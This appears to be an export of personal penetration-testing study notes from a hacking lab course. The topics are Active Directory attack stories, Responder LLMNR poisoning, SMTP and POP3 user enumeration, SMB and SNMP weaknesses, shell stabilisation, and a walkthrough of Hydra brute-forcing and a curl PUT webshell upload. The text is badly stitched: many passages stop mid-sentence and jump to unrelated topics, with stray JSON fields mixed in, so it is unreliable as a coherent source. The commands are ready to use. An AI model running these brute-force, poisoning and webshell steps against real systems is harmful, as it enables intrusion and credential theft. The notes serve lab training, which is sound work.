Windows","kind":"Section","source":"Active Directory/10 Credentialed Enumeration from Windows.md","subject":"ad","derived":false,"sourceCapture":false,"body":"Situational Awareness:  The primary objective is to understand the domain's structure, including trusts, users, groups, computers, and permissions.\nBuilt-in vs. Third-Party Tools:  The section introduces both native Windows tools (like the ActiveDirectory PowerShell module) and popular third-party tools (like PowerView, Snaffler, and BloodHound/SharpHound). compromised a single host and gained  SYSTEM  level access. Because this was a domain-joined host, I was able to use this access to enumerate the domain. I went through all of the standard enumeration, but did not find much. There were  Service Principal Names  (SPNs) present within the environment, and I was able to perform a Kerberoasting attack and retrieve TGS tickets for a few accounts. I attempted to crack these with Hashcat and some of my standard wordlists and rules, but was unsuccessful at first. I ended up leaving a cracking job running overnight with a very large wordlist combined with the  d3ad0ne  rule that ships with Hashcat. The next morning I had a hit on one ticket and retrieved the cleartext password for a user account. This account did not give me significant access, but it did give me write access on certain file shares. I used this access to drop SCF files around the shares and left Responder going. After a while, I got a single hit, the  NetNTLMv2 hash  of a user. I checked through the BloodHound output and noticed that this user was actually a domain admin! Easy day from here.\nSecond example:\nPassword spraying can be an extremely effective way to gain a foothold in a domain, but we must exercise great care not to lock out user accounts in the process. On one engagement, I found an SMB NULL session using the  enum4linux  tool and retrieved both a listing of  all  users from the domain, and the domain  password policy . Knowing the password policy was crucial because I could ensure that I was staying within the parameters to not lock out any accounts and also knew that the policy was a minimum eight-character password and password complexity was enforced (meaning that a user's password required 3/4 of special character, number, uppercase, or lower case number, i.e., Welcome1). I tried several common weak passwords such as Welcome1,  Password1 , Password123,  Spring2018 , etc. but did not get any hits. Finally, I made an attempt with  Spring@18  and got a hit! Using this account, I ran BloodHound and found several hosts where this user had local admin access. I noticed that a domain admin account had an active session on one of these hosts. I was able to use the Rubeus tool and extract the Kerberos TGT ticket for this domain user. From there, I was able to perform a  pass-the-ticket  attack and authenticate as this domain admin user. As a bonus, I was able to take over the trusting domain as well because the Domain Administrators group for the domain that I took over was a part of the Administrators group in the trusting domain via nested group membership, meaning I could use the same set of credentials to authenticate to the other domain with full administrative level access.\nThird example:\nI had tried all of my standard ways to obtain a foothold on this third engagement, and nothing had worked. I decided that I would use the  Kerbrute  tool to attempt to enumerate valid usernames and then, if I found any, attempt a targeted password spraying attack since I did not know the password policy and didn't want to lock any accounts out. I used the  linkedin2username  tool to first mashup potential usernames from the company's LinkedIn page. I combined this list with several username lists from the  statistically-likely-usernames  GitHub repo and, after using the  userenum  feature of Kerbrute, ended up with 516 valid users. I knew I had to tread carefully with password spraying, so I tried with the password  Welcome2021  and got a single hit! Using this account, I ran the Python version of BloodHound from my attack host and found that all domain users had RDP access to a single box. I logged into this host and used the PowerShell tool  DomainPasswordSpray  to spray again. I was more confident this time around because I could a) view the password policy and b) the DomainPasswordSpray tool will remove accounts close to lockout from the target list. Being that I was authenticated within the domain, I could now spray with all domain users, which gave me significantly more targets. I tried again with the common password Fall2021 and got several hits, all for users not in my initial wordlist. I checked the rights for each of these accounts and found that one was in the Help Desk group, which had  GenericAll  rights over the  Enterprise Key Admins  group. The Enterprise Key Admins group had GenericAll privileges over a domain controller, so I added the account I controlled to this group, authenticated again, and inherited these privileges. Using these rights, I performed the  Shadow Credentials  attack and retrieved the NT hash for the domain controller machine account. With this NT hash, I was then able to perform a DCSync attack and retrieve the NTLM password hashes for all users in the domain because a domain controller can perform replication, which is required for DCSync.\nSource:  original AD notes , lines 1–26. We want to acquire cleartext credentials for domain account thereby gaining us a foothold in the domain.\nWe will perform man-in-the-middle attack on Linked-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, we may get low-privileged or administrative level password hashes that can also sometimes be used to perform SMB relay attacks.\nLLMNR & NBT-NS Primer\nThey are used if DNS fails for host identification. If DNS fails for some reason then LLMNR is used and it asks all machines on the local network for the correct host address. LLMNR is based upon the Domain Name System (DNS) and allows the hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP. If LLMNR fails then NBT-NS will be used. It identifies systems on a local network by their NetBIOS name. It utilizes port 137 over UDP.\nThe thing is, when LLMNR and NBT-NS are used for name resolution, ANY host on the  network can reply. This is where we come in with the Responder and poison these requests. We can poison the authoritative name resolution source in the broadcast domain by responding to LLMNR nad NBT-NS traffic as if they have the answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending we know about the requested host. If the requested host requires authentication then we capture NetNTLM hash and attempt offline password recovery or relay a live authentication exchange where the protocol permits; the captured NetNTLM response is not an NT hash for pass-the-hash. We can then use it against different protocols such as LDAP.\nExample for LLMNR/NBT-NS poisoning.\nLet's say the host is attempting to connect to \\print1.inlanefreight.local but accidentally types in \\ printer1@inlanefreight.local\nDNS server responds with not knowing this host\nThen host broadcasts request to the entire network asking if anyone knows this host and its location (\\ printer1@inlanefreight.local )\nWe (the attacker with Responder) respond to the host stating that we are the \\ printer1@inlanefreight.local\nThe host believes us and sends a username and a NetNTLMv2 challenge-response to authenticate\nWe then attempt to crack the captured NetNTLMv2 response offline and use it elsewhere.\nSeveral tools can be used for this purpose:\nResponder\nInveigh\nMetasploit\nResponder is written in Python and typically used on a Linux host, while Inveigh is written in C# and PowerShell. Responder also has a .exe version that works on Windows. Both can attack:\nLLMNR\nNBT-NS\nMDNS\nDNS\nDHCP\nICMP\nHTTP\nHTTPS\nSMB\nLDAP\nWebDAV\nProxy Auth\nResponder also has support for:\nPOP3\nMSSQL\nDCE-RPC\nFTP\nIMAP\nSMTP auth\nWe can see Responder options if we type:\nresponder -h\nthere are some interesting options:\nflag -A puts us in Analyze mode so there is no poisoning just NBT-NS, LLMNR, MDNS requests in environment.\nWe must always supply either interface or an ip address.\nWe may typically also commonly use -wf option. -w is for starting WPAD rouge proxy server, and -f is for attempting to fingerprint the  remote host.\nwe can use -v for increased verbosity\nalso we can use -F or -P to force NTLM/Basic or proxy authentication but it may cause a login prompt.\n-w flag utilizes the built-in WPAD proxy server and this can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.\nWith this configuration shown above, Responder will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the  /usr/share/responder/logs  directory. Hashes are saved in the format  (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt , and one hash is printed to the console and stored in its associated log file unless  -v  mode is enabled. For example, a log file may look like  SMB-NTLMv2-SSP-172.16.5.25 . Hashes are also stored in a SQLite database that can be configured in the  Responder.conf  config file, typically located in  /usr/share/responder  unless we clone the Responder repo directly from GitHub.\nwe must run responder with sudo.\nOn the windows we can run Inveigh\nIt is a tool written in PowerShell and C#. A secondary keeps its copy of the zone in sync using the  SOA (Start of Authority)  record's serial number and timers:\nSOA field | Purpose\nSerial | Version number of the zone. The secondary compares it to its own to decide whether a transfer is needed.\nRefresh | How often the secondary polls the primary to check the serial.\nRetry | How long to wait after a failed refresh before retrying.\nExpire | How long the secondary keeps serving the zone if it can't reach the primary.\nNegative TTL | How long  NXDOMAIN  (non-existent name) answers are cached.\nTwo things trigger a refresh:\nPolling  — the secondary checks the primary's serial on a timer (the SOA  Refresh  interval).\nNOTIFY  (RFC 1996) — the primary  pushes  a \"zone changed\" message so secondaries pull immediately instead of waiting for the timer.\nWhen a transfer happens, the secondary requests one of two types:\nAXFR  (RFC 5936) — a  full  transfer of every record. POP3/IMAP won't tell you — they just reject bad logins. But the  SMTP  server sitting on port 25 will, because of how it was designed to validate recipients. SMTP has three verbs that, on a misconfigured server, confirm whether a username is real:\nVRFY <user>  — literally \"verify this user exists.\" The server answers differently for valid vs invalid accounts.\nEXPN <list>  — expands a mailing list into its members.\nRCPT TO:<user>  — during a fake message, the server accepts the recipient if the mailbox exists and rejects it if not. This is the most reliable method because  VRFY / EXPN  are often disabled.\nThe attack works because the server's  response code differs  for real vs fake users (e.g.  250 OK  vs  550 no such user ). You diff those responses to build a list of valid accounts — which then feeds the Hydra brute-force and, once you have a password, the IMAP/POP3 read below.\n# Manual check with netcat\nnc <IP> 25\nVRFY root\nVRFY nonexistentuser123\n# Compare the two response codes — a difference means VRFY leaks valid users\n# Automated with smtp-user-enum (tries each name and reports which the server accepts)\nsmtp-user-enum -M VRFY -U users.txt -t <IP>\nsmtp-user-enum -M RCPT -U users.txt -t <IP>   # fall back to RCPT if VRFY is disabled\nsmtp-user-enum -M RCPT -U users.txt -D domain -t <IP> #we can add -D for domain\n-M  picks the verb ( VRFY ,  EXPN , or  RCPT );  -U  is your candidate username list;  -t  is the target. The client says \"connect to me on port X,\" and the server initiates from its port 20. This breaks through client-side firewalls/NAT (the server connecting inward is usually blocked), which is why it's largely obsolete.\nPassive mode (PASV)  — the  client  opens both connections. The server says \"connect to me on port Y,\" and the client initiates. This is firewall-friendly and the default today.\nWhy this matters practically\nIf transfers hang after login \"succeeds,\" it's almost always an active/passive mismatch or a firewall blocking the data channel. Most CLI clients let you toggle with  passive  once connected. You rarely need to think about it, but knowing it explains the failure mode.\nFTP is plaintext\nCredentials and file contents travel  unencrypted . Anyone sniffing the network sees the  USER / PASS  exchange in the clear. Modern NFSv4 consolidates everything onto  2049 , but you'll still see 111 on older setups, and it's what  rpcinfo  queries.\nIdentity is just numeric UID/GID.  This is the crucial concept. NFS (v3 especially) doesn't authenticate  users  — it trusts whatever  UID/GID  the client claims. On older or misconfigured Windows/Samba systems, a null session is allowed and lets us enumerate users, groups, and policy with  no credentials at all .\nWhy null sessions are a goldmine\nMicrosoft locked these down over the years, but legacy systems, domain controllers with loose settings, and Samba shares still permit them. A client (your box, or another Windows machine) connects to a server's TCP  445  and asks to use a  share  — a named, exported folder or resource like  \\\\SERVER\\Finance  or the hidden admin share  \\\\SERVER\\C$ . Everything in SMB hangs off this idea of connecting to a named share and then reading/writing files or calling management functions through it.\nA few concepts you need so the rest makes sense:\nShares.  A server publishes one or more shares. Some are user-created ( Finance ,  IT ,  devshare ); some are built-in administrative shares ending in  $  ( C$  = the whole C: drive,  ADMIN$  = the Windows folder,  IPC$  = the inter-process communication share). The  $  just means \"hidden from casual browsing\" — it does  not  mean protected.\nIPC$ and named pipes.   IPC$  is a special share that doesn't hold files; it's the channel used for  remote management calls  (the same MS-RPC functions  rpcclient  uses to list users, groups, and the password policy). This is why connecting to  IPC$  with no credentials — a  null session  — can leak so much.\nPorts 139 vs 445.  Modern SMB runs  directly over TCP 445 . The older  139  ran SMB over NetBIOS; you'll still see it on legacy systems. Either open port means SMB is in play.\nDialects (versions).  SMBv1 is ancient and dangerous (it's the version EternalBlue/MS17-010 exploited). SMBv2/v3 are current; v3 adds encryption. The dialect a server still accepts is itself a finding.\nWhy SMB is such a high-value target\nThree different wins live behind the same port: (1)  file shares  routinely contain plaintext credentials, configs, private keys, and backups; (2) the  IPC$ / RPC  channel leaks the user list, groups, and password policy you need to spray credentials; and (3) with admin-level credentials, SMB is a direct path to  remote code execution  (PsExec-style). A client connects to port 25 and exchanges plain commands; the server answers with  three-digit status codes  ( 250  = OK,  550  = failure, etc. — see  SMTP Status Code Cheat Sheet ). A normal message looks like this:\nHELO attacker.com            # (or EHLO) introduce yourself; EHLO lists server capabilities\nMAIL FROM:<sender@x.com>     # who the mail is from (the \"envelope sender\")\nRCPT TO:<victim@target.com>  # who it's going to (the server checks if this mailbox exists)\nDATA                         # begin the message body\nSubject: hi\n...message...\n.                            # a single dot on its own line ends the message\nQUIT\nTwo design facts drive everything we do with it:\nThe server validates recipients.  When you send  RCPT TO:<user> , the server has to decide whether that mailbox exists — and it answers  differently  for real vs fake addresses. That difference leaks the user list.\nSMTP was built to relay.  A mail server's whole job is to accept a message and forward it onward. Whether it  should  relay a given message depends on configuration — and a server that relays for  anyone  is an  open relay .\nWhy SMTP is useful even without credentials\nYou don't need to log in to talk to port 25. The recipient-validation behavior means you can confirm which usernames exist  pre-authentication , and an open relay lets you send mail  pre-authentication . The  manager  is the monitoring station (e.g. a NOC server running something like PRTG or Nagios). The  agent  is a small service running on each managed device that exposes that device's internal state. The manager polls agents; agents answer. Devices can also push unsolicited alerts (called  traps ) back to the manager when something happens.\nThere are only three operations you really need to understand:\nGET  — the manager asks the agent for the value of something (\"what processes are running?\", \"what's your hostname?\"). This is what we abuse to enumerate.\nSET  — the manager  changes  a value on the device (reconfigure an interface, reboot, etc.). If we get write access, this becomes a foothold.\nTRAP  — the agent pushes an alert to the manager unprompted. Less relevant to us offensively, but it's why you'll also see UDP 162.\nThe reason SNMP is so dangerous is that the agent will happily answer GET requests from  anyone  who knows the  community string  — and that string is the only thing standing between an attacker and the device's entire internal inventory.\nThe core weakness: community strings are cleartext \"passwords\"\nIn  SNMP v1 and v2c  (by far the most common in the wild) the community string is sent  in plaintext over UDP  with every request — no hashing, no encryption, no challenge-response. So if you can guess or sniff it, you have full access at that string's privilege level. Worse, the defaults are almost never changed:\npublic  →  read-only  access (read the entire device state)\nprivate  →  read/write  access (read  and  reconfigure the device via SET)\nSNMP v3  fixed this by adding real usernames, authentication (HMAC), and encryption — but you'll still find v1/v2c everywhere, especially on printers, IoT, and forgotten appliances.","description":"SNMP is built on a simple manager ↔ agent model. The full stabilization below turns it into a near-native terminal. It matters because half-broken shells get you killed mid-engagement — you fat-finger  Ctrl-C , lose the session, and have to re-exploit.\nThe reason this works: the raw netcat session has no real PTY, so the local and remote terminals disagree about who handles line editing and signals. You spawn a PTY remotely, then reconfigure your  local  terminal to pass keystrokes through raw (so the remote PTY handles them), and finally tell the remote shell your real terminal size and type.\n# 1. On the TARGET shell — spawn a proper PTY\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# 2. Background the shell: press Ctrl-Z (drops you back to your LOCAL terminal)\n\n# 3. On YOUR box — set the local terminal to raw and re-foreground the shell\nstty raw -echo; fg\n#   stty raw -echo = stop the local terminal from intercepting keys/signals\n#   fg             = bring the backgrounded remote shell back (press Enter once or twice)\n\n# 4. Back on the TARGET — declare your terminal type and size so editors/clear work\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 38 columns 116        # use your real size — check with `stty size` locally first\nAfter this you have working arrow keys, history, tab-completion,  Ctrl-C  that only kills the foreground command, and full-screen programs (vim, less) that render correctly.\nIf you ever exit and your local terminal is broken (no echo, garbled)\nYour  stty raw -echo  is still in effect locally. Just type  reset  (even if you can't see it) and press Enter to restore your terminal.\nAlternatives when Python isn't available\nscript -qc /bin/bash /dev/null  spawns a PTY without Python. Or skip raw-shell pain entirely: if you have any credentials, pivot to  SSH  or, on Windows,  evil-winrm  for a properly interactive session (see the remote-management notes).","description":"pty.spawn gives you a prompt, but it's still a \"dumb\" shell: no tab-completion, no arrow keys/history, and Ctrl-C kills your whole shell instead of the running command. A DNS's canonical name (CNAME) record is used to map different domains to a parent domain. Many organizations use third-party services like AWS, GitHub, Akamai, Fastly, and other content delivery networks (CDNs) to host their content. A mail server can receive emails from a client device and send them to other mail servers. A mail server can also deliver emails to a client device. A client is usually the device where we read our emails (computers, smartphones, etc.).\nWhen we press the Send button in our email application (email client), the program establishes a connection to an SMTP server on the network or Internet. The name SMTP stands for Simple Mail Transfer Protocol, and it is a protocol for delivering emails from clients to servers and from servers to other servers.\nWhen we download emails to our email application, it will connect to a POP3 or IMAP4 server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.\nBy default, POP3 clients remove downloaded messages from the email server. This behavior makes it difficult to access email on multiple devices since downloaded messages are stored on the local computer. However, we can typically configure a POP3 client to keep copies of downloaded messages on the server.\nOn the other hand, by default, IMAP4 clients do not remove downloaded messages from the email server. This behavior makes it easy to access email messages from multiple devices. Let's see how we can target mail servers.\nDiagram of email flow: 1. Email sent from a computer via SMTP to a server. 2. These serve as a type of permission that determines what tasks and actions can be performed on the system. In simple terms, it can be compared to a bus ticket. If we use a ticket intended for a particular region, we will be able to use the bus, and otherwise, we will not. These privileges (or figuratively speaking, our tickets) can also be used for different means of transport, such as planes, trains, boats, and others. In computer systems, these privileges serve as control and segmentation of actions for which different permissions, controlled by the system, are needed. Therefore, the rights are checked based on this categorization when a process needs to fulfill its task. If the process satisfies these privileges and conditions, the system approves the action requested. We can divide these privileges into the following areas:\nPrivileges | Description\nSystem | These privileges are the highest privileges that can be obtained, which allow any system modification. For security reasons, separate users are often set up for particular services during the installation of Linux distributions.\nGroups | Groups are a categorization of at least one user who has certain permissions to perform specific actions.\nPolicies | Policies determine the execution of application-specific commands, which can also apply to individual or grouped users and their actions.\nRules | Rules are the permissions to perform actions handled from within the applications themselves.\nLog4j\nWhat made the Log4j vulnerability so dangerous was the Privileges that the implementation brought. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port 139 and UDP ports 137 and 138. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port 445 without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.\nSamba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.\nFor instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.\nAnother protocol that is commonly related to SMB is MSRPC (Microsoft Remote Procedure Call). RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in MS-RPCE, which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.\nTo attack an SMB Server, we need to understand its implementation, operating system, and which tools we can use to abuse it. As with other services, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Furthermore, after we gain access to the SMB Service, if we interact with a shared folder, we need to be aware of the content in the directory. The Windows Sysinternals website was created in 1996 by Mark Russinovich and Bryce Cogswell to offers technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment. Microsoft acquired Windows Sysinternals and its assets on July 18, 2006.\nSysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows. The software can now be found on the Microsoft website. One of those freeware tools to administer remote systems is PsExec.\nPsExec is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a named pipe that can send commands to the system.\nWe can download PsExec from Microsoft website, or we can use some Linux implementations:\nImpacket PsExec - Python PsExec like functionality example using RemComSvc.\nImpacket SMBExec - A similar approach to PsExec without using RemComSvc. Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.\nLet's illustrate an example to understand better how Responder works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:\ngrcic550@htb[/htb]$ responder -I <interface name>\nWhen a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:\nThe hostname file share's IP address is required.\nThe local host file (C:\\Windows\\System32\\Drivers\\etc\\hosts) will be checked for suitable records.\nIf no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.\nIs there no local DNS record? A query will be sent to the DNS server that has been configured.\nIf all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.\nSuppose a user mistyped a shared folder's name \\mysharefoder\\ instead of \\mysharedfolder. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.\ngrcic550@htb[/htb]$ sudo responder -I ens33\n\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n We can use the rpclient man page or SMB Access from Linux Cheat Sheet from the SANS Institute to explore this further.\nPersonal note — the Samba \"Guest\" trap\nWhy You Needed --local-auth (The Samba \"Guest\" Trap)\nWhen you ran your initial password audit against the target, NetExec's output dropped a massive clue: [+] \\admin:liverpool (Guest) along with Null Auth:True.\nHere is exactly what was happening behind the scenes:\nThe Default Behavior: The target machine is a Linux server running Samba. Samba has a built-in fallback feature: if a user tries to log in with credentials that the system doesn't validate as a real, privileged user account, it doesn't always throw an error. Instead, it says, \"Sure, come on in, but I'm dropping you into a restricted Guest session.\"\nThe Tool's Misinterpretation: Because the SMB server responded with a successful connection status (even though it was just a Guest token), NetExec assumed the username and password combination was valid. It effectively masked the true authentication failures.\nWhat --local-auth Does: By appending --local-auth, you explicitly instruct NetExec to bypass domain-level fallbacks and force the target to authenticate the credentials against its local SAM database (or /etc/samba/smbpasswd on Linux). This strips away the Guest session safety net. registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.\nDomain takeover is also possible with subdomains called subdomain takeover. A DNS's canonical name (CNAME) record is used to map different domains to a parent domain. Many organizations use third-party services like AWS, GitHub, Akamai, Fastly, and other content delivery networks (CDNs) to host their content. In this case, they usually create a subdomain and make it point to those services. For example,\nsub.target.com.   60   IN   CNAME   anotherdomain.com\nThe domain name (e.g., sub.target.com) uses a CNAME record to another domain (e.g., anotherdomain.com). Suppose the anotherdomain.com expires and is available for anyone to claim the domain since the target.com's DNS server has the CNAME record. In that case, anyone who registers anotherdomain.com will have complete control over sub.target.com until the DNS record is updated.\nSubdomain Enumeration\nBefore performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like Subfinder. This tool can scrape subdomains from open sources like DNSdumpster. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.\nVRFY this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.\nVRFY Command\ngrcic550@htb[/htb]$ telnet 10.10.110.20 25\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n220 parrot ESMTP Postfix (Debian/GNU)\n\nVRFY root\n\n252 2.0.0 root\n\nVRFY www-data\n\n252 2.0.0 www-data\n\nVRFY new-user\n\n550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table\nEXPN is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as \"all.\"\nEXPN Command\ngrcic550@htb[/htb]$ telnet 10.10.110.20 25\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n220 parrot ESMTP Postfix (Debian/GNU)\n\nEXPN john\n\n250 2.1.0 john@inlanefreight.htb\n\nEXPN support-team\n\n250 2.0.0 carol@inlanefreight.htb\n250 2.1.5 elisa@inlanefreight.htb\nRCPT TO identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.\nRCPT TO Command\ngrcic550@htb[/htb]$ telnet 10.10.110.20 25\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n220 parrot ESMTP Postfix (Debian/GNU)\n\nMAIL FROM:test@htb.com\nit is\n250 2.1.0 test@htb.com... Sender ok\n\nRCPT TO:julio\n\n550 5.1.1 julio... User unknown\n\nRCPT TO:kate\n\n550 5.1.1 kate... User unknown\n\nRCPT TO:john\n\n250 2.1.5 john... Recipient ok\nWe can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command USER followed by the username, and if the server responds OK. This means that the user exists on the server.\nUSER Command\ngrcic550@htb[/htb]$ telnet 10.10.110.20 110\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n+OK POP3 Server ready\n\nUSER julio\n\n-ERR\n\nUSER john\n\n+OK\nTo automate our enumeration process, we can use a tool named smtp-user-enum. We can specify the enumeration mode with the argument -M followed by VRFY, EXPN, or RCPT, and the argument -U with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument -D. Finally, we specify the target with the argument -t.\ngrcic550@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7\n\nStarting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )\n\n ----------------------------------------------------------\n|                   Scan Information                       |\n ----------------------------------------------------------\n\nMode ..................... A few Hack The Box boxes demonstrate email attacks, such as Rabbit, which deals with brute-forcing Outlook Web Access (OWA) and then sending a document with a malicious macro to phish a user, SneakyMailer which has elements of phishing and enumerating a user's inbox using Netcat and an IMAP client, and Reel which dealt with brute-forcing SMTP users and phishing with a malicious RTF file.\nIt's worth playing these boxes, or at least watching the Ippsec video or reading a walkthrough to see examples of these attacks in action. This goes for any attack demonstrated in this module (or others). The site ippsec.rocks can be used to search for common terms and will show which HTB boxes these appear in, which will reveal a wealth of targets to practice against.\nAttacking Common Services -Easy (breakdown of what I did so you can add necessary things in notebook)\nPhase 0 — Credential Access (Hydra + rockyou.txt against FTP)Before any of the web-facing exploitation could happen, valid credentials were needed. The username fiona had already been identified through earlier enumeration. To get the password, a brute-force attack was run directly against the FTP service (port 21) using Hydra paired with rockyou.txt — the classic leaked-password wordlist (originally from the 2009 RockYou breach) that ships by default with Kali Linux.On Kali, rockyou.txt ships gzip-compressed to save disk space and normally needs to be extracted once before first use:sudo gunzip /usr/share/wordlists/rockyou.txt.gzThen the brute-force itself, testing every password in the list against the known username over FTP:hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.78.187-l fiona fixes the username, -P <wordlist> feeds Hydra the password list to iterate through, and ftp://<target> tells Hydra which protocol module to use — Hydra has protocol-specific modules (ftp, ssh, http-get, mysql, smb, etc.) and picks behavior accordingly. This eventually produced a hit: fiona:987654321. Those credentials turned out to be valid not just for FTP but also for CoreFTP's HTTP(S) interface and for the MariaDB service itself — a common pattern on these boxes, where a single service account's credentials are reused across multiple exposed services.Lesson for the notebook: always check whether credentials found for one service (FTP here) work against other exposed services on the same box (HTTP Basic Auth, database logins, SMB, etc.) before assuming you need to crack each one separately. Credential reuse across services is extremely common and saves a lot of time.Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) ServiceWith fiona:987654321 in hand, the next step was probing what CoreFTP's web-facing interface actually allowed. CoreFTP exposes an HTTP(S) service that, in vulnerable configurations, accepts PUT requests and writes the request body straight to disk as a file. Proof of concept:curl -k -X PUT -H \"Host: $target\" --basic -u fiona:987654321 --data-binary \"PoC.\" --path-as-is https://$target/docs.txtBreaking this down: -k ignores the self-signed TLS certificate (CoreFTP's HTTPS service isn't using a CA-trusted cert), -X PUT sets the HTTP method to PUT instead of the default GET, -H \"Host: $target\" sets the Host header explicitly, --basic -u fiona:987654321 sends HTTP Basic Authentication with the cracked credentials, --data-binary \"PoC.\" sends the literal string PoC. as the request body, and --path-as-is stops curl from \"cleaning up\" the URL path (important once you start trying path traversal or unusual paths — curl by default will collapse things like ../ unless told not to).Verifying the write landed, by requesting the same file back with a normal GET:curl -k -H \"Host: $target\" --basic -u fiona:987654321 https://$target/docs.txtThis returned PoC. — confirming the server had written our request body to disk and would serve it back on request. Arbitrary file write, confirmed.Critical detail that becomes important later: the response headers on the PUT request included:Server: Core FTP HTTP Server\nContent-type: application/octet-streamThis tells you exactly which server handled the request — CoreFTP's own built-in HTTP server, not Apache/XAMPP. That's a completely separate service from the actual web application stack, even though both are reachable over HTTP(S) on the same box. This distinction is the root cause of a mistake that got made twice later in the session.Mistake #1 — Assuming a Successful PUT Upload Equals Code ExecutionWith file-write access confirmed, the natural next move was uploading an actual PHP webshell the same way:curl -k -X PUT -H \"Host: $target\" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is https://$target/shell.phpThis succeeded — HTTP/1.1 200 Ok, 5490 bytes written — and it felt like a working exploit chain at that point. But it wasn't. The problem is exactly the detail flagged above: this PUT request goes to CoreFTP's own HTTP server, which just writes and serves raw bytes. It has no PHP interpreter behind it at all. So requesting shell.php back from that server would just return (or, from a browser, download) the literal PHP source code as a static file — it would never actually run. A .php extension means nothing to a server that isn't specifically configured to hand .php requests off to a PHP interpreter.The lesson: a successful file write is not the same thing as code execution. You have to confirm the file lands somewhere a script interpreter is actually watching — in this case, Apache's document root — not just anywhere on disk that happens to be reachable over HTTP. This exact mistake got repeated later in the session with a second webshell (see Mistake #3 below), which is what finally made the pattern fully click.Mistake #2 — Local curl Error Misread as a Server-Side ProblemA later attempt at the same kind of upload produced this:curl -k -X PUT -H \"Host:  http://10.129.78.187 \" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is  https://10.129.78.187/shell.php\ncurl: Failed to open shell.php\ncurl: option --data-binary: error encountered when reading a fileAt first glance this looks like it could be an auth issue, a TLS issue, or a server-side rejection. It's none of those — it's a purely local filesystem error. The @ prefix in --data-binary @shell.php is special curl syntax meaning \"read the request body from this local file\" (as opposed to a literal string, which is what the earlier \"PoC.\" example used). Curl tried to open a file called shell.php in the current working directory — which, based on the shell prompt (~), was the home directory — and it wasn't there. Nothing about the target, the network, or the credentials was involved in this failure at all.This became clear by comparing it against a command that did work:curl -k -H \"Host:  http://10.129.78.187 \" --basic -u fiona:987654321  https://10.129.78.187/docs.txtThis  one has no -X PUT and no --data-binary — it's a plain GET request, so there's no local file dependency to fail on, which is exactly why it succeeded while the PUT command failed.The lesson: when a curl command errors out, check whether the error message is actually about your local machine before assuming it's a target/network/auth problem. The fix here was simply confirming the file existed in the expected location (ls -la shell.php) and either cd-ing to the correct directory or recreating the file.Phase 2 — Direct MariaDB Access (and Why This Isn't \"SQL 